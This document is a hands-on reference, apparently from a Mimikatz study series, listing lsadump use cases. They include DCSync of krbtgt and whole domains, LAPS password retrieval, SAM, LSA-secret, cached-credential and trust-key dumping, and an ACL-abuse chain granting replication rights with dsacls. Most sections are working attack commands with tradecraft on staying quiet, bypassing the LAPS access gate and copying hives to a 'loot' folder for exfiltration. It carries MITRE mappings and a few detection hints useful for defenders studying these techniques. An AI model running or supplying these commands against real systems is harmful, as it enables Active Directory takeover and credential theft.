# Mimikatz — lsadump (DCSync) — Hands-On Use Cases

Every DCSync scenario below builds on the same core mechanic documented in `01 - Overview.md` §How It Works — an `IDL_DRSGetNCChanges` RPC call against a Domain Controller, authorized purely by the caller's AD extended rights. What changes is *what* gets requested and *how much*. The `sam`/`secrets`/`cache`/`trust`/`netsync` scenarios are structurally different — no network replication at all — and are grouped separately below. MITRE ATT&CK IDs are tagged per scenario; where no dedicated sub-technique exists, that's stated explicitly rather than forced.

## Contents
- [DCSync a Single High-Value Account](#dcsync-a-single-high-value-account)
- [DCSync a Regular User Account](#dcsync-a-regular-user-account)
- [Full-Domain DCSync](#full-domain-dcsync)
- [DCSync a Deleted/Tombstoned Account](#dcsync-a-deletedtombstoned-account)
- [Bulk DCSync Output for Scripting](#bulk-dcsync-output-for-scripting)
- [Forcing NTLM Authentication for the DCSync RPC Bind](#forcing-ntlm-authentication-for-the-dcsync-rpc-bind)
- [Pulling LAPS-Managed Local Admin Passwords via DCSync](#pulling-laps-managed-local-admin-passwords-via-dcsync)
- [Local SAM Dump (Live)](#local-sam-dump-live)
- [Offline SAM/SECURITY Hive Analysis from a Volume Shadow Copy](#offline-samsecurity-hive-analysis-from-a-volume-shadow-copy)
- [LSA Secrets Extraction](#lsa-secrets-extraction)
- [Cached Domain Logon (MSCache) Extraction](#cached-domain-logon-mscache-extraction)
- [Inter-Domain Trust Key Extraction](#inter-domain-trust-key-extraction)
- [Legacy Netlogon Current+Previous Hash Retrieval](#legacy-netlogon-currentprevious-hash-retrieval)
- [Chained DCSync After ACL-Abuse Privilege Escalation](#chained-dcsync-after-acl-abuse-privilege-escalation)

---

## DCSync a Single High-Value Account

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```
The canonical DCSync call. Requests a single object's replication data — the domain's `krbtgt` account, whose NTLM hash and AES keys are exactly what's needed to forge Golden Tickets (full depth in the planned `kerberos (Golden-Silver Ticket)/` sub-module). `/domain:` can be omitted if the operator's own computer is already domain-joined to the target domain; `/dc:` can likewise be omitted and mimikatz will locate a DC itself. This is a single `IDL_DRSGetNCChanges` round-trip (`ulExtendedOp=EXOP_REPL_OBJ`, `cMaxObjects=1`) — the quietest possible DCSync call.

## DCSync a Regular User Account

**MITRE ATT&CK:** T1003.006

```
mimikatz # lsadump::dcsync /domain:corp.local /user:CORP\jsmith
```
Identical mechanism, arbitrary target. Recovers `jsmith`'s NTLM hash (and Kerberos keys, if the account has ever authenticated with a client capable of AES) directly from the DC — the operator never touches `jsmith`'s workstation, never needs `jsmith` to be logged on anywhere, and leaves nothing on the DC's disk. `/guid:<object-guid>` is an equivalent alternative to `/user:` when the account's GUID (rather than name) is already known — e.g. from prior LDAP/BloodHound enumeration.

## Full-Domain DCSync

**MITRE ATT&CK:** T1003.006, plus [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage) is *not* applicable here — this is on-prem AD, included for contrast only

```
mimikatz # lsadump::dcsync /domain:corp.local /all
```
Sets `ulExtendedOp=0` and `cMaxObjects=1000` per round instead of a single-object pull — mimikatz loops `IDL_DRSGetNCChanges`, feeding each response's USN watermark into the next request's `usnvecFrom`, until the DC signals `fMoreData=FALSE`. This is the network-protocol equivalent of exfiltrating the entire `ntds.dit` — every account's credential material, in one operation, with none of the file-size or `vssadmin`-usage footprint that copying the actual database would leave. Materially louder than a single-object pull: many RPC round-trips against the same DC in quick succession (see `04 - Target Evidence.md`'s volumetric-signal discussion).

## DCSync a Deleted/Tombstoned Account

**MITRE ATT&CK:** T1003.006

```
mimikatz # lsadump::dcsync /domain:corp.local /user:former-svc-account /deleted
```
Deleted AD objects aren't immediately purged — they become tombstones and remain recoverable for a configurable tombstone lifetime (commonly 180 days by default on modern domains). `/deleted` tells mimikatz to include tombstoned objects in scope, letting an operator recover credential material for an account that's since been removed but whose tombstone hasn't yet been garbage-collected — relevant when an account was deleted *specifically* as part of incident cleanup, under the mistaken assumption that deletion also destroys its recoverable credential history.

## Bulk DCSync Output for Scripting

**MITRE ATT&CK:** T1003.006

```
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```
`/csv` switches `kuhl_m_lsadump_dcsync_descrObject_csv` in for the default, verbose per-object output — one compact line per account instead of a multi-line block — built specifically for piping a full-domain pull into a script or hash-cracking pipeline rather than reading it interactively.

## Forcing NTLM Authentication for the DCSync RPC Bind

**MITRE ATT&CK:** T1003.006

```
mimikatz # lsadump::dcsync /domain:corp.local /user:jsmith /authntlm
```
By default the RPC bind authenticates via `RPC_C_AUTHN_GSS_NEGOTIATE` (Kerberos-first). `/authntlm` forces `RPC_C_AUTHN_WINNT` (NTLM) instead — relevant when the operator's context can authenticate via NTLM but has no practical path to a Kerberos ticket for the target domain (no line-of-sight to a KDC from the current network position, or the credential material on hand is an NTLM hash rather than a ticket/password). Trades Kerberos's stronger default protections for NTLM's broader reachability.

## Pulling LAPS-Managed Local Admin Passwords via DCSync

**MITRE ATT&CK:** T1003.006, plus [T1555](https://attack.mitre.org/techniques/T1555/) (Credentials from Password Stores) for what LAPS itself is

```
mimikatz # lsadump::dcsync /domain:corp.local /user:WORKSTATION01$ /laps
```
`ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime` (the classic, pre-Windows-LAPS attribute names) are **dynamically assigned schema attribute IDs**, not part of mimikatz's static replicated-OID table — so `/laps` first performs an LDAP schema lookup against the DC (`schemaNamingContext`) to resolve their current `attributeID`, then adds those resolved IDs to the DCSync request's partial-attribute-set before issuing it. Recovers the target computer object's LAPS-managed local Administrator password directly via replication, rather than needing `ExtendedRight` read access to the attribute through normal LDAP (which is the access LAPS itself is designed to gate) — DCSync rights bypass that gate entirely, since replication doesn't go through the same access-check path as an ordinary LDAP read.

## Local SAM Dump (Live)

**MITRE ATT&CK:** [T1003.002](https://attack.mitre.org/techniques/T1003/002/) (OS Credential Dumping: Security Account Manager)

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```
No DRSUAPI, no network protocol at all — direct registry reads of `HKLM\SYSTEM` and `HKLM\SAM` on the local machine. `token::elevate` is required first: the SAM hive's ACL restricts read access to the `SYSTEM` account specifically, and a plain administrator token (even with `SeDebugPrivilege` enabled) cannot open it. Recovers every local account's LM/NTLM hash — relevant on any standalone host, but especially on domain members where the local Administrator account's password has been reused across the fleet (a classic lateral-movement enabler `sekurlsa::pth` then exploits).

## Offline SAM/SECURITY Hive Analysis from a Volume Shadow Copy

**MITRE ATT&CK:** T1003.002, plus [T1006](https://attack.mitre.org/techniques/T1006/) (Direct Volume Access) for the VSS step

```
# On the target, create a shadow copy to get a read-consistent snapshot of locked hive files
vssadmin create shadow /for=C:

# Copy the hives out of the shadow (path/device number varies per host)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\loot\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\loot\SYSTEM

# Transfer both files off the target, then on an analysis machine:
mimikatz # lsadump::sam /system:C:\loot\SYSTEM /sam:C:\loot\SAM
```
The quiet-target variant, directly analogous to `sekurlsa`'s minidump path (`sekurlsa (Credential Dumping)/02 - Hands-On Use Cases.md`): the only touch on the target host itself is the VSS creation and two file copies — no live registry access, no `token::elevate`, no LSASS interaction of any kind. All parsing happens later, entirely on the operator's own machine.

## LSA Secrets Extraction

**MITRE ATT&CK:** [T1003.004](https://attack.mitre.org/techniques/T1003/004/) (OS Credential Dumping: LSA Secrets)

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets
```
Reads `HKLM\SECURITY\Policy\Secrets` — the store for service-account passwords configured to run as a specific domain/local account, saved RDP/auto-logon credentials, and other secrets Windows itself needs to persist. Same SYSTEM-only ACL gate as `lsadump::sam`. A single compromised host running a domain service account under LSA Secrets is a common, high-value lateral-movement pivot — the recovered credential is frequently a legitimate domain account with broader rights than the local admin used to reach it.

## Cached Domain Logon (MSCache) Extraction

**MITRE ATT&CK:** [T1003.005](https://attack.mitre.org/techniques/T1003/005/) (OS Credential Dumping: Cached Domain Credentials)

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
```
Recovers **MSCache/DCC2** hashes — a separate, deliberately non-reversible-to-NTLM iterated hash Windows caches locally (default: last 10 logons per machine) so a domain user can still log on when the DC is unreachable. **This is not an NTLM hash and cannot be used directly for pass-the-hash** — it's only useful for offline password cracking (far slower to crack than NTLM, by design). Relevant specifically when live DCSync/SAM access isn't available but a laptop or offline host still holds cached credentials for domain accounts that have since logged onto it.

## Inter-Domain Trust Key Extraction

**MITRE ATT&CK:** T1003 (OS Credential Dumping — no dedicated ATT&CK sub-technique covers trust-key extraction specifically), feeding into [T1558](https://attack.mitre.org/techniques/T1558/) (Steal or Forge Kerberos Tickets) for what the recovered key is used for next

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::trust /patch
```
Extracts the shared trust key(s) between the current domain and every domain/forest it trusts. A recovered inter-realm trust key lets an operator forge cross-trust Kerberos tickets (an inter-realm/"cross-trust Golden Ticket" variant) — a materially higher-blast-radius credential than a single account's hash, since it can potentially grant access across an entire trust relationship rather than one domain. `/patch` is used here because it removes the need to independently obtain a SYSTEM token first, at the cost of a write-capable LSASS memory access (see `01 - Overview.md`) instead of the default path's read-only-but-SYSTEM-gated one.

## Legacy Netlogon Current+Previous Hash Retrieval

**MITRE ATT&CK:** T1003 (general — no dedicated sub-technique), plus [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash) for what the recovered hash typically enables next

```
mimikatz # lsadump::netsync /dc:DC01.corp.local /user:WORKSTATION01$ /ntlm:cc36cf7a8514893efccd332446158b1a
```
Requires the account's **current** NTLM hash already, obtained some other way — `netsync` doesn't grant new access on its own, it establishes a legitimate Netlogon secure channel using that known hash and asks the DC (via `I_NetServerTrustPasswordsGet`) for the account's **current and previous** hash. Its narrow, specific value: confirming a hash is still valid without risking a live authentication attempt against it, or recovering the immediately-prior password from before the account's last scheduled machine-account rotation (every 30 days by default). Distinct from `lsadump::zerologon`, which achieves a similar-looking secure-channel establishment but via CVE-2020-1472's cryptographic flaw, requiring no prior knowledge of any credential at all — out of scope for this note.

## Chained DCSync After ACL-Abuse Privilege Escalation

**MITRE ATT&CK:** T1003.006 for the DCSync itself — the ACL-abuse precursor step doesn't map cleanly to a single ATT&CK ID and isn't forced into one here

```
# 1. Prior enumeration (e.g. BloodHound) identifies that a compromised service account
#    holds GenericAll/WriteDacl on the domain object itself

# 2. Use that existing right to grant the compromised account DS-Replication-Get-Changes
#    and DS-Replication-Get-Changes-All directly (via dsacls.exe, PowerShell ActiveDirectory
#    module, or equivalent — not a mimikatz function; this step is standard AD administration
#    tooling used offensively)
dsacls "DC=corp,DC=local" /G "CORP\svc-backup:CA;DS-Replication-Get-Changes"
dsacls "DC=corp,DC=local" /G "CORP\svc-backup:CA;DS-Replication-Get-Changes-All"

# 3. DCSync now succeeds from an account that never had these rights natively
mimikatz # lsadump::dcsync /domain:corp.local /all
```
DCSync is rarely the *first* technique in an intrusion chain against AD — it's the payoff step once some other path (a misconfigured/over-permissioned ACE on the domain object, an over-scoped delegation, a compromised Azure AD Connect/Entra Connect sync account) has already produced a principal holding replication rights. The `dsacls`-granting step above is a distinct, separately-detectable AD-object-modification event (Directory Service Changes auditing, Event 5136) from the DCSync pull that follows it — worth correlating both, not just the replication call in isolation.
